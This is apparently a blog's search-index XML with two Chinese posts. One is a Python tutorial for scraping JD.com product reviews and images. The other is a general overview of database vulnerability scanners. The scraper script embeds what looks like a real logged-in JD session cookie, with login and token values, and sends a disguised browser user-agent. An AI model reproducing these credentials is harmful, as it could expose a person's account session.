<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>爬取京东商品评价信息实战</title>
      <link href="/posts/db2fbb43/"/>
      <url>/posts/db2fbb43/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240311/0%E3%80%81%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB.png" alt="网络爬虫"></p><p>上期介绍了通过《<a href="http://xiejava.ishareread.com/posts/81e07ee2/" target="_blank" rel="noopener">mitmproxy实战-通过mitmdump爬取京东金榜数据</a>》，能够上京东金榜的商品一般评价都是比较好的，这次介绍如何爬取京东商品的评价信息。</p><h2 id="一、分析商品评价的页面信息"><a href="#一、分析商品评价的页面信息" class="headerlink" title="一、分析商品评价的页面信息"></a>一、分析商品评价的页面信息</h2><h3 id="1、请求参数分析"><a href="#1、请求参数分析" class="headerlink" title="1、请求参数分析"></a>1、请求参数分析</h3><p>京东的商品评价信息是在商品的详情页面，我们随便访问一个京东的商品详情页面如<a href="https://item.jd.com/100087971268.html" target="_blank" rel="noopener">https://item.jd.com/100087971268.html</a><br>在这里可以看到100087971268就是商品ID也是商品的skuId，这个是商品的唯一ID可以和很过信息关联。我们可以通过chrome浏览器的调试模式来分析商品评价信息的数据是如何获取和展示的。<br>通过chrome浏览器的调试模式可以看到，评价信息是通过<code>https://api.m.jd.com/?appid=item-v3&amp;functionId=pc_club_productPageComments&amp;client=pc&amp;clientVersion=1.0.0&amp;t=1710122207175&amp;loginType=3&amp;uuid=181111935.16953916127351737253418.1695391613.1709713566.1710121957.56&amp;productId=100087971268&amp;score=0&amp;sortType=5&amp;page=0&amp;pageSize=10&amp;isShadowSku=0&amp;fold=1&amp;bbtf=&amp;shield=</code><br>这个接口来返回的，其中关键的信息包括functionId=pc_club_productPageComments，productId=100087971268，page=0&amp;pageSize=10。<br><code>productId=100087971268</code>表示是获取商品ID为100087971268的商品评价，<code>page=0&amp;pageSize=10</code>表示当前页是0，每页显示10条记录。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240311/1%E3%80%81%E5%95%86%E5%93%81%E8%AF%A6%E6%83%85%E9%A1%B5%E9%9D%A2%E5%88%86%E6%9E%90.png" alt="分析详情页"></p><h3 id="2、接口返回信息分析"><a href="#2、接口返回信息分析" class="headerlink" title="2、接口返回信息分析"></a>2、接口返回信息分析</h3><p>我们可以切换到Response的标签页，分析接口的返回信息</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240311/2%E3%80%81%E5%95%86%E5%93%81%E8%AF%84%E4%BB%B7%E6%8E%A5%E5%8F%A3%E8%BF%94%E5%9B%9E%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90.png" alt="商品评价接口返回信息分析"></p><p>在这里可以看到通过接口反馈的是一个json格式的数据，其中评价信息就在comments的节点里，我们只要解析这个json就可以得到具体的评价信息了。<br>通过参数的分析和返回结果的分析后，就可以开始编码实现了。</p><h2 id="二、爬取京东商品评价信息代码实现"><a href="#二、爬取京东商品评价信息代码实现" class="headerlink" title="二、爬取京东商品评价信息代码实现"></a>二、爬取京东商品评价信息代码实现</h2><p>编码主要实现两个部分的内容<br>1、是要组织请求参数，将请求URL的一些参数用变量替换，如商品ID，当前页等。<br>2、是要解析返回的JSON数据，从JSON数据中解析获取需要的评价信息以及下载评价信息中的图片。<br>在组织请求参数的时候，有两个关键信息，一个是Cookie信息，一个是请求的URL，因为访问京东的接口要登录，所以需要Cookie的信息。这些信息都可以在登录到京东后在chrome浏览器的调试模式中可以拿到。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240311/3%E3%80%81%E7%BB%84%E7%BB%87%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0.png" alt="组织请求参数"></p><h3 id="1、具体代码"><a href="#1、具体代码" class="headerlink" title="1、具体代码"></a>1、具体代码</h3><p><strong>具体代码如下：</strong><br>getJDProdComments.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlretrieve</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">sleeptime = <span class="number">1</span>  <span class="comment"># 休眠时间</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 浏览器访问伪装</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'cookie'</span>: <span class="string">'___jdu=16953916127351737253418; shshshfpa=423ebd76-fc1a-89d5-d47a-a981cedfdsf57-1686fds5177; shshshfpx=423ebd76-fc1a-89d5-d47a-a981ced31f57-1686405177; pinId=OlFK9xcJEZ3Ep3CJn7-LwLV9-x-f3wj7; pin=jd_5ab1043c91fdff; unick=xiejava; _tp=xRz2UIA0gXgQ0KtQA8IW%2BhMgOusl53MovCk%2FP0TxaIM%3D; _pst=jd_5ab1043c91bff; PCSYCityID=CN_430000_430100_0; areaId=18; ipLoc-djd=18-1482-48942-49058; b_dh=1179; b_dpr=1.100000023841858; b_webp=1; b_avif=1; autoOpenApp_downCloseDate_auto=1705396790105_1800000; b_dw=1555; __jdv=91748099|baidu|-|organic|notset|1705397493195; jsavif=1; mba_muid=16953916127351737253418; wlfstk_smdl=4d5qhwajihbur3xtxm1dghq2bwl9ebii; 3AB9D23F7A4B3C9B=ONVXQU6KOVA46KLMDJWYJ2CLCGZLCKH4NFEKT6ANBHIYQJBOWM3KHFJ3RT5NO6GKP2BQVONOJWLAKMJUMNJOAMEHJE; TrackID=1wLmzwr1GPygNiM7hoidalzvJbkLlnJRs7c_e2wlsv7h_VHaLyqnXTiW1_vIDBhlEusopAT977EO67KV2n2vMV9jMUQx8MO9jJQMMv8skxrE; thor=C1CD4973B7F47EE1FE45201B5AB2281DC485D58F5BD12AA8CEC6335A9B07F5E3F1BFD9D9DEA859A32AEDE0F33C45B55AA44327ACD87A8E174C645BE4BC987735B3DD969561D2D0AA492DD1FEC1A793AF265724B02F9850F35F0CA58E8E4A5A3C212B0734C80AD560D299EC59026506C127E953C92D271932DDDBF32BEC59091745A6CB143671358CC8A866B9A298AA865F60B9AC41AD05C6EB6781C131BD05DD; flash=2_7Kqrs87KZ1MjgKXGB8QJTs9NjTmYiJCdEV8xYwXCMezATHn-bD7kirFJuQx5ogyzo_yuQHefS-MTOx8D5rxn-5ZxA8-qMHyBfYw-1ULH1bq*; ceshi3.com=103; __jdc=181111935; token=7482844f43473090375d99ad860b4294,3,947486; __tk=mLVlrKTimJznoD3PmcVvYmZmldTlkbVaommnjmTankZOmmPDolZTZmTfSJvkYRmblDzYrLKC,3,947486; shshshsID=a8f2acdf15967d81d4c5d8b5a45b7796_1_1705476526446; 3AB9D23F7A4B3CSS=jdd03ONVXQU6KOVA46KLMDJWYJ2CLCGZLCKH4NFEKT6ANBHIYQJBOWM3KHFJ3RT5NO6GKP2BQVONOJWLAKMJUMNJOAMEHJEAAAAMNCZJJB5QAAAAAD26SPFPWINAFQMX; _gia_d=1; shshshfpb=BApXeNARaFehAyBNmDl1nYWazwPZ1Fa6NB8QBVlhW9xJ1Mt5if4S2; __jda=181111935.16953916127351737253418.1695391613.1705471486.1705476528.12; __jdb=181111935.1.16953916127351737253418|12.1705476528; joyya=1705472508.1705476529.27.0u3hno2'</span>,</span><br><span class="line">    <span class="string">'referer'</span>: <span class="string">'https://item.jd.com/'</span>,</span><br><span class="line">    <span class="string">'user-agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.37'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jd_prod_pic_save_path = <span class="string">'jd_prod_pic'</span>  <span class="comment"># 图片保存目录</span></span><br><span class="line"></span><br><span class="line">page_range = <span class="number">50</span>   <span class="comment"># 翻50页取500条记录</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getJDProdComment</span><span class="params">(prod_skuId)</span>:</span></span><br><span class="line">    big_pag_path = <span class="string">'//img30.360buyimg.com/shaidan/s616x405_jfs/'</span>  <span class="comment"># 评价大图地址</span></span><br><span class="line">    tiny_pag_path = <span class="string">'//img30.360buyimg.com/n0/s128x96_jfs/'</span>       <span class="comment"># 评价缩略图地址</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(page_range):</span><br><span class="line">        comments_url = <span class="string">'https://api.m.jd.com/?appid=item-v3&amp;functionId=pc_club_productPageComments&amp;client=pc&amp;clientVersion=1.0.0&amp;t=1705853247039&amp;loginType=3&amp;uuid=181111935.16953916127351737253418.1695391613.1705847111.1705852812.35&amp;productId='</span>+str(prod_skuId)+<span class="string">'&amp;score=0&amp;sortType=5&amp;page='</span>+str(i)+<span class="string">'&amp;pageSize=10&amp;isShadowSku=0&amp;fold=1&amp;bbtf=&amp;shield='</span></span><br><span class="line">        data = requests.get(comments_url, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            content_data=data.content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            json_data=json.loads(content_data)</span><br><span class="line">            print(json_data)</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                productCommentSummary=json_data.get(<span class="string">'productCommentSummary'</span>)</span><br><span class="line">                print(prod_skuId, str(productCommentSummary))</span><br><span class="line">                hotCommentTagStatistics=json_data.get(<span class="string">'hotCommentTagStatistics'</span>)</span><br><span class="line">                print(prod_skuId,str(hotCommentTagStatistics))</span><br><span class="line">            comments=json_data.get(<span class="string">'comments'</span>)</span><br><span class="line">            <span class="keyword">if</span> comments <span class="keyword">and</span> len(comments)&gt;<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> comment <span class="keyword">in</span> comments:</span><br><span class="line">                    prod_comment_guid=comment.get(<span class="string">'guid'</span>)</span><br><span class="line">                    prod_comment_content=str(comment.get(<span class="string">'content'</span>))</span><br><span class="line">                    prod_comment=str(comment)</span><br><span class="line">                    images=comment.get(<span class="string">'images'</span>)</span><br><span class="line">                    savepath=os.path.join(jd_prod_pic_save_path,str(prod_skuId),<span class="string">'comments'</span>,prod_comment_guid)</span><br><span class="line">                    <span class="keyword">if</span> images <span class="keyword">and</span> len(images)&gt;<span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">for</span> image <span class="keyword">in</span> images:</span><br><span class="line">                            str_image_url=image.get(<span class="string">'imgUrl'</span>).replace(tiny_pag_path, big_pag_path)</span><br><span class="line">                            image_url=<span class="string">'https:'</span>+str_image_url</span><br><span class="line">                            filename=os.path.basename(image_url)</span><br><span class="line">                            downloadfile(image_url, savepath, filename) <span class="comment">#下载图片</span></span><br><span class="line">                            time.sleep(sleeptime)</span><br><span class="line">                    print(prod_comment_guid,prod_skuId,prod_comment_content,prod_comment)</span><br><span class="line">            time.sleep(sleeptime)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">downloadfile</span><span class="params">(downloadurl,savepath,savefilename)</span>:</span></span><br><span class="line">    savefile = os.path.join(savepath, savefilename)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(savepath):</span><br><span class="line">            os.makedirs(savepath)</span><br><span class="line">            <span class="comment"># 判断文件是否存在，如果不存在则下载</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(savefile):</span><br><span class="line">            print(<span class="string">'Downloading data from %s'</span> % downloadurl)</span><br><span class="line">            urlretrieve(downloadurl, filename=savefile)</span><br><span class="line">            print(<span class="string">'\nDownload finished!'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'File already exsits!'</span>)</span><br><span class="line">        <span class="comment"># 获取文件大小</span></span><br><span class="line">        filesize = os.path.getsize(savefile)</span><br><span class="line">        <span class="comment"># 文件大小默认以Bytes计， 转换为Mb</span></span><br><span class="line">        print(<span class="string">'File size = %.2f Mb'</span> % (filesize / <span class="number">1024</span> / <span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'downloadfile Error:'</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    getJDProdComment(<span class="string">'100087971268'</span>)</span><br></pre></td></tr></table></figure><p>以上代码中的Cookie信息，需要根据自己登录后从chrome浏览器的调试模式中拿到的Cookie信息替换。</p><h3 id="2、运行效果"><a href="#2、运行效果" class="headerlink" title="2、运行效果"></a>2、运行效果</h3><p><strong>运行效果：</strong></p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240311/4%E3%80%81%E8%BF%90%E8%A1%8C%E6%95%88%E6%9E%9C.png" alt="运行效果"></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据安全之认识数据库漏洞扫描系统</title>
      <link href="/posts/eed12364/"/>
      <url>/posts/eed12364/</url>
      
        <content type="html"><![CDATA[<p>随着信息技术的迅猛发展和互联网的普及，数据库作为存储、管理和检索大量数据的关键组件，其安全性对于企业和组织来说至关重要。然而，由于网络环境的复杂性和攻击手段的多样性，数据库面临着越来越多的安全威胁。黑客可能利用已知的漏洞或弱点，对数据库进行非法访问、数据窃取或篡改，从而给企业和组织带来巨大的经济损失和声誉风险。</p><p>为了应对这些安全挑战，数据库漏洞扫描系统应运而生。该系统基于漏洞数据库，通过扫描等手段对指定的远程或本地计算机系统的安全脆弱性进行检测，发现可利用的漏洞。它能够帮助企业和组织及时发现并修复数据库中的安全漏洞，提高数据库的安全防护能力，降低潜在的安全风险。</p><p>本文让我们一起来认识一下数据库漏洞扫描系统。</p><h2 id="一、什么是数据库漏洞扫描系统"><a href="#一、什么是数据库漏洞扫描系统" class="headerlink" title="一、什么是数据库漏洞扫描系统"></a>一、什么是数据库漏洞扫描系统</h2><p>数据库漏洞扫描系统是一种专业的数据库安全产品，它基于对数据库访问控制、数据库审计、资源管理、数据库加密以及数据库系统本身安全机制的深入分析，深入研究和发现数据库系统本身存在的BUG以及数据库管理、使用中存在的问题。</p><p>该系统的核心功能在于对数据库系统进行自动化安全评估。通过读取数据库的信息与安全策略进行综合分析，能够充分扫描出数据库系统的安全漏洞和威胁，并自动给出详细的漏洞描述、漏洞来源及修复建议。此外，它还提供智能的修复建议和完整的数据库漏洞报告、数据库安全评估报告，帮助用户进行漏洞修复，从而保护数据库的安全。</p><p>数据库漏洞扫描系统的主要特性之一是拥有全面的漏洞库，支持CVE、CNNVD等披露的数据库安全漏洞，并按高、中、低、信息四个级别进行不同层级的漏洞威胁排列。这使得系统能够更准确地识别和评估数据库中的安全风险。</p><p>数据库漏洞扫描系统是数据库安全评估工具之一，能够找出数据库自身的安全漏洞和使用中的安全隐患。</p><h2 id="二、数据库漏洞扫描系统的发展历程"><a href="#二、数据库漏洞扫描系统的发展历程" class="headerlink" title="二、数据库漏洞扫描系统的发展历程"></a>二、数据库漏洞扫描系统的发展历程</h2><p>数据库漏洞扫描系统的发展历程是一个伴随着数据库技术、网络安全威胁以及信息技术发展的不断演进过程。<br>在早期，数据库的安全主要依赖于基本的访问控制和加密技术，但随着网络攻击手段的不断升级和复杂化，传统的安全措施已经无法满足需求。因此，对数据库进行漏洞扫描和风险评估的需求逐渐凸显。</p><p>随着技术的发展，数据库漏洞扫描系统开始兴起。这些系统能够自动化地检测数据库中的安全漏洞，提供修复建议，并帮助用户保持数据库的安全健康状态。它们基于漏洞数据库，通过扫描等手段对指定的远程或本地计算机系统的安全脆弱性进行检测，发现可利用的漏洞。</p><p>随着时间的推移，数据库漏洞扫描系统不断发展和完善。它们不仅支持更多的数据库类型和版本，还提供了更全面的漏洞检测和修复建议。此外，一些高级的数据库漏洞扫描系统还具备了合规性检查、弱口令检测等功能，能够更好地满足用户的安全需求。</p><p>近年来，随着云计算、大数据、人工智能等技术的快速发展，数据库漏洞扫描系统也迎来了新的发展机遇。通过集成这些先进技术，数据库漏洞扫描系统能够更加高效、准确地发现安全漏洞，提供更为智能的修复方案，为用户的数据库安全保驾护航。</p><p>数据库漏洞扫描系统的发展历程是一个不断进步和完善的过程，它随着数据库技术和网络安全威胁的发展而不断演进，为用户提供更加全面、高效的安全保障。</p><h2 id="三、数据库漏洞扫描系统的主要功能"><a href="#三、数据库漏洞扫描系统的主要功能" class="headerlink" title="三、数据库漏洞扫描系统的主要功能"></a>三、数据库漏洞扫描系统的主要功能</h2><p>数据库漏洞扫描系统具备多种功能，这些功能共同协作，以全面评估数据库的安全性并发现潜在的安全风险。主要功能包括：</p><ol><li>漏洞检测与发现：这是数据库漏洞扫描系统的核心功能。它能够扫描并检测数据库系统中的各种漏洞，包括已知和未知的漏洞。这些漏洞可能涉及SQL注入、跨站脚本攻击（XSS）、未授权访问等安全风险。</li><li>安全风险评估：在发现漏洞后，系统能够对这些漏洞进行风险评估，判断其可能对数据库系统造成的潜在影响。这有助于用户优先处理那些风险较高的漏洞。</li><li>修复建议与报告：基于漏洞检测和风险评估的结果，系统能够生成详细的修复建议和报告。这些建议通常包括如何修复漏洞、加强数据库安全配置、更新补丁等，帮助用户及时消除潜在的安全风险。</li><li>多平台与多数据库支持：系统需要支持多种操作系统和数据库管理系统，以确保无论用户使用的是哪种数据库或操作系统，都能进行有效的扫描和评估。</li><li>自定义扫描策略：系统应允许用户定义自定义的扫描策略，以满足特定的安全需求和环境。这可以包括扫描的深度、范围、时间等参数的设置。</li><li>定期扫描与监控：数据库漏洞扫描系统还应具备定期扫描和监控功能，以便及时发现并处理新的安全威胁。这有助于保持数据库系统的持续安全性。</li></ol><h2 id="四、数据库漏洞扫描系统的基本原理"><a href="#四、数据库漏洞扫描系统的基本原理" class="headerlink" title="四、数据库漏洞扫描系统的基本原理"></a>四、数据库漏洞扫描系统的基本原理</h2><p>数据库漏洞扫描系统的原理基于自动化的安全测试技术，用于检测数据库系统中存在的潜在安全漏洞。以下是该系统的基本原理：</p><ol><li>信息收集：首先，扫描系统会对目标数据库进行信息收集。这包括获取数据库的类型、版本、配置信息，以及运行的操作系统和服务等。这些信息有助于确定扫描的范围和策略，以及为后续的漏洞检测提供基础数据。</li><li>漏洞检测规则：系统内置了大量的漏洞检测规则，这些规则是根据已知的安全漏洞和攻击手法编写的。这些规则可能涉及SQL注入、跨站脚本攻击（XSS）、权限提升等常见的数据库安全威胁。</li><li>扫描与测试：利用上述的漏洞检测规则，扫描系统会对数据库进行深入的扫描和测试。这可能包括发送特定的查询请求到数据库，观察和分析数据库的响应，以及尝试利用潜在的漏洞。</li><li>漏洞验证：当扫描系统发现潜在的漏洞时，它会尝试进一步验证这些漏洞的存在和利用性。这通常涉及更复杂的测试和攻击模拟，以确保检测到的漏洞是真实存在的，并且可以被攻击者利用。</li><li>报告与修复建议：最后，扫描系统会生成详细的漏洞报告，列出所有检测到的漏洞及其严重程度。同时，系统还会提供修复建议，帮助数据库管理员或安全专家及时修复这些漏洞，提高数据库的安全性。</li></ol><p>需要注意的是，数据库漏洞扫描系统虽然功能强大，但也存在一定的局限性。它可能无法检测到所有类型的漏洞，特别是那些新出现或特定环境下的漏洞。此外，系统的准确性和可靠性也受到多种因素的影响，如扫描策略的选择、数据库环境的复杂性等。因此，在使用数据库漏洞扫描系统时，需要结合其他安全措施和人工分析，以确保数据库的安全性。</p><h2 id="五、为什么企业需要数据库漏洞扫描系统"><a href="#五、为什么企业需要数据库漏洞扫描系统" class="headerlink" title="五、为什么企业需要数据库漏洞扫描系统"></a>五、为什么企业需要数据库漏洞扫描系统</h2><p>黑客常利用数据库的各种漏洞来对数据库进行攻击，例如数据库用户密码的脆弱性，非法的远程连接，数据库用户占用CPU会话数过多等。对于不同的数据库，漏洞也不同。如：目前oracle数据库的漏洞就有超过1000项，SQL Server有超过500项。只要一个漏洞被黑客利用，数据库就有被破坏的危险。还有一点也很重要，操作系统安全不能说明数据库是安全的。辟如我们目前使用的数据库大部分都是关系型数据库，而关系型数据库一般都是通过端口的方式来进行访问的，这种访问方式是可以绕开操作系统的验证的。</p><p>企业之所以需要数据库漏洞扫描系统，主要基于以下几个方面的原因：</p><ol><li>识别与修复安全漏洞：数据库是企业存储关键信息和数据的核心组件，其安全性至关重要。然而，由于软件研发过程中可能存在的普遍问题，如引用第三方开源代码和运行环境的不确定性，数据库可能面临各种已知和未知的漏洞。数据库漏洞扫描系统能够自动化地扫描数据库，识别出潜在的安全漏洞，并提供修复建议。这有助于企业及时发现并修复安全漏洞，降低资产风险。</li><li>满足法律合规要求：在数字化时代，网络安全等级保护等法规要求企业对其信息系统进行安全漏洞的检测和修补。数据库漏洞扫描系统能够帮助企业满足这些法律合规要求，确保企业信息系统的安全。</li><li>提高安全管理效率：传统的安全管理方式可能耗时且效率低下，而数据库漏洞扫描系统能够自动化执行漏洞扫描，大大提高安全检测的效率和准确性。同时，系统还能提供针对性的安全建议，帮助企业优化其安全策略和措施，从而进一步提高网络安全水平。</li><li>增强品牌声誉和客户信任：通过及时发现并修复数据库的安全漏洞，企业能够防止数据泄露和系统崩溃等安全事件的发生，从而保护客户信息的安全。这有助于增强客户对企业的信任，提高品牌声誉，为企业赢得更多的商业机会。</li></ol><p>综上所述，企业在日常运营中应充分考虑引入并使用数据库漏洞扫描系统。</p><h2 id="六、数据库漏洞扫描系统的部署方式"><a href="#六、数据库漏洞扫描系统的部署方式" class="headerlink" title="六、数据库漏洞扫描系统的部署方式"></a>六、数据库漏洞扫描系统的部署方式</h2><p>数据库漏洞扫描系统的部署方式主要可以分为以下几种：</p><ol><li>网络集成部署：这种方式是将数据库漏洞扫描系统部署在网络中的某个节点，使其能够与网络中的数据库进行通信并执行扫描任务。这种部署方式通常需要对网络架构进行一定的配置，以确保扫描系统能够顺利访问目标数据库。</li><li>分布式部署：对于大型网络或分布式数据库环境，可以采用分布式部署方式。这意味着在多个网络节点或数据库服务器上部署扫描系统的组件，以实现并行扫描和集中管理。这种部署方式可以提高扫描效率，并更好地适应复杂网络环境的需求。</li><li>独立部署：在某些情况下，数据库漏洞扫描系统可以独立部署在单个设备或服务器上。这种方式适用于对特定数据库或特定环境进行单独的扫描任务。独立部署可以确保扫描系统的独立性和安全性，避免与其他系统或网络产生冲突。</li></ol><p>需要注意的是，具体的部署方式应根据实际情况和需求进行选择。在选择部署方式时，需要考虑网络架构、数据库类型、扫描需求以及安全性等因素。同时，部署过程中需要确保遵循相关的安全标准和最佳实践，以确保扫描系统的正常运行和数据的安全性。</p><h2 id="七、为什么系统漏洞扫描-网络漏洞扫描系统不能代替数据库漏洞扫描系统？"><a href="#七、为什么系统漏洞扫描-网络漏洞扫描系统不能代替数据库漏洞扫描系统？" class="headerlink" title="七、为什么系统漏洞扫描/网络漏洞扫描系统不能代替数据库漏洞扫描系统？"></a>七、为什么系统漏洞扫描/网络漏洞扫描系统不能代替数据库漏洞扫描系统？</h2><p>系统漏洞扫描系统是检查操作系统中存在的漏洞，其扫描对象是操作系统，操作系统是大型数据库系统的运行平台，为数据库系统提供一定程度的安全保护。但是当入侵是通过数据库开放的端口进行时，操作系统就无能为力了。</p><p>网络漏洞扫描系统是一种基于网络的漏洞扫描和分析工具软件，能够自动检查主机、网络设备的安全漏洞。系统管理员利用漏洞扫描技术对局域网络、Web站点、主机操作系统、系统服务以及防火墙系统的安全漏洞进行扫描，可以能够及时发现网络漏洞并在网络攻击者扫描和利用之前予以修补，从而提高网络的安全。</p><p>相比之下，数据库漏洞扫描系统专门针对数据库进行安全检测。数据库系统的安全性很大程度上是依赖于数据库管理系统。如果数据库管理系统的安全机制非常强大，则数据库系统的安全性能就较好。数据库漏洞扫描系统它能够识别数据库中的安全漏洞，包括SQL注入、未授权访问等数据库特有的安全威胁。此外，数据库漏洞扫描系统还能评估数据库的配置和权限设置，发现潜在的安全风险，并提供相应的修复建议。</p><p>虽然系统漏洞扫描和网络漏洞扫描系统能够提升整体网络安全水平，但它们无法替代数据库漏洞扫描系统在数据库安全方面的专业性和深入性。为了全面保障网络安全，需要综合运用多种扫描系统，从多个层面进行安全检测和防护。</p><h2 id="八、数据库漏洞扫描系统的局限性和挑战"><a href="#八、数据库漏洞扫描系统的局限性和挑战" class="headerlink" title="八、数据库漏洞扫描系统的局限性和挑战"></a>八、数据库漏洞扫描系统的局限性和挑战</h2><p>数据库漏洞扫描系统能够发现数据库中的安全漏洞并提供修复建议，但也存在一些局限性和挑战。如：</p><ol><li>无法检测所有漏洞：尽管数据库漏洞扫描系统可以检测大量的已知漏洞，但它可能无法检测到所有类型的漏洞。特别是对于那些新出现的、未知的或者特定环境下的漏洞，系统可能无法进行有效识别。</li><li>误报和漏报的可能性：在某些情况下，系统可能会误报一些并非真正存在的漏洞，或者漏报一些实际存在的安全风险。这可能是由于扫描过程中的一些技术限制或者环境差异导致的。</li><li>依赖于数据库的配合：数据库漏洞扫描系统通常需要数据库的配合才能进行完整的扫描。如果数据库管理员不提供足够的权限或者对扫描过程进行限制，系统可能无法全面评估数据库的安全性。</li><li>需要人工分析和判断：尽管系统可以生成详细的漏洞报告和修复建议，但最终的决策和修复工作仍然需要由数据库管理员或安全专家来执行。因此，对人员的专业技能和经验有一定要求。</li><li>对复杂环境的挑战：在复杂的数据库环境中，如分布式数据库、云数据库等，数据库漏洞扫描系统可能面临更大的挑战。这些环境可能涉及多个组件、网络和安全策略，使得扫描和评估过程更加复杂和困难。</li></ol><p>针对以上挑战，数据库漏洞扫描系统的发展趋势主要体现在以下几个方面：</p><ol><li>技术集成与智能化：随着人工智能、大数据等技术的快速发展，数据库漏洞扫描系统将更加注重技术的集成和智能化。例如，通过集成机器学习和深度学习算法，系统能够更精准地识别和分析漏洞，提供更为智能化的修复建议。</li><li>云化与平台化：云计算的普及使得越来越多的应用和服务迁移到云端。因此，数据库漏洞扫描系统也将逐步云化，为用户提供更为便捷、灵活的服务。同时，平台化也是一个重要的发展趋势，通过构建统一的安全管理平台，实现多种安全工具和服务的集成和协同。</li><li>全面性与精细化：随着数据库类型的多样化和复杂性的增加，数据库漏洞扫描系统需要支持更多的数据库类型和版本，并提供更为全面和精细化的漏洞检测。这意味着系统需要不断更新和优化漏洞数据库，提高检测的准确性和效率。</li><li>合规性与标准化：随着网络安全法规的不断完善，数据库漏洞扫描系统需要更加注重合规性和标准化。系统需要能够按照相关法规和标准进行检测和报告，帮助企业满足法律合规要求。</li><li>自动化与响应式安全：自动化是数据库漏洞扫描系统的重要发展方向。通过实现自动化的扫描、分析和修复流程，可以大大提高安全管理的效率。同时，响应式安全也是未来的一个关键趋势，系统需要能够实时监测数据库的安全状况，对新的漏洞和威胁进行快速响应。</li></ol><p>综上所述，数据库漏洞扫描系统的发展趋势是多元化、集成化、云化、平台化、全面化、精细化、合规化、自动化和响应式安全。这些趋势将有助于提升数据库漏洞扫描系统的性能和功能，为企业提供更为全面、高效和智能的安全保障。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
